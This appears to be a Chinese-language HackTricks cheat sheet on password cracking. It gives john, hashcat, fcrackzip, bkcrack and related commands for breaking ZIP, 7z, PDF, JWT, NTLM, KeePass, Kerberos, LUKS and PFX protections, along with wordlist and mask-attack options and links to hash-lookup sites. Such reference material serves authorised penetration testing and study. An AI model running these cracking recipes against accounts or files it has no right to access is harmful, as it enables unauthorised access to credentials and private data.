{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 本地

### 在线破解数据库

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?)（MD5 & SHA1）
* [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php)（MSCHAPv2/PPTP-VPN/NetNTLMv1 带/不带 ESS/SSP 以及任何挑战值）
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com)（哈希值、WPA2 抓包和 MSOffice、ZIP、PDF 归档文件）
* [https://crackstation.net/](https://crackstation.net)（哈希值）
* [https://md5decrypt.net/](https://md5decrypt.net)（MD5）
* [https://gpuhash.me/](https://gpuhash.me)（哈希值和文件哈希值）
* [https://hashes.org/search.php](https://hashes.org/search.php)（哈希值）
* [https://www.cmd5.org/](https://www.cmd5.org)（哈希值）
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker)（MD5、NTLM、SHA1、MySQL5、SHA256、SHA512）
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html)（MD5）
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

在尝试暴力破解哈希之前，请先查看这些资源。

### ZIP
```bash
#sudo apt-get install fcrackzip
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### 已知明文的zip攻击

您需要知道加密zip内部包含的文件的**明文**（或部分明文）。您可以通过运行：**`7z l encrypted.zip`**来检查加密zip内部包含的**文件名和文件大小**。\
从发布页面下载 [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)。
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd
unzip unlocked.zip #User new_pwd as password
```
### 7z
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### PDF所有者密码

要破解PDF所有者密码，请查看此内容：[https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### NTLM 破解
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Lucks 图像

#### 方法 1

安装：[https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### 方法 2
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
另一个Luks BF教程：[http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### Mysql
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### PGP/GPG 私钥
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### 思科

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI 主密钥

使用 [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) 然后使用 john

### Open Office 密码保护列

如果你有一个 xlsx 文件，其中一列被密码保护，你可以解除保护：

* **上传到谷歌云端硬盘**，密码将自动被移除
* 要**手动移除**密码：
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### PFX 证书
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
使用 [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) 来轻松构建并**自动化工作流程**，这些工作流程由世界上**最先进的**社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 工具

**哈希示例：** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-identifier
```bash
hash-identifier
> <HASH>
```
### 词表

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - 密码**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **词表生成工具**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** 高级键盘走位生成器，可配置基础字符、键位图和路径。
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### John 变异

阅读 _**/etc/john/john.conf**_ 并进行配置
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Hashcat 攻击

* **字典攻击** (`-a 0`) 配合规则

**Hashcat** 已经包含了一个**包含规则的文件夹**，但你可以在[**这里找到其他有趣的规则**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)。
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Wordlist combinator** 攻击

可以使用hashcat将**两个词表合并成一个**。\
如果列表1包含单词 **"hello"** 而第二个列表包含两行，单词分别是 **"world"** 和 **"earth"**。将会生成单词 `helloworld` 和 `helloearth`。
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **掩码攻击** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* 字典 + 掩码 (`-a 6`) / 掩码 + 字典 (`-a 7`) 攻击
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Hashcat 模式
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
破解Linux哈希 - /etc/shadow文件
```
500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
# 破解Windows哈希值
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
破解常见应用程序哈希
```
900 | MD4                                              | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
1400 | SHA-256                                          | Raw Hash
1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 如果您在**网络安全公司**工作，想在**HackTricks**中看到您的**公司广告**，或者想要获取**PEASS最新版本或下载HackTricks的PDF**？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列。
* 获取[**官方PEASS & HackTricks周边商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
使用 [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) 轻松构建并**自动化工作流程**，由世界上**最先进**的社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
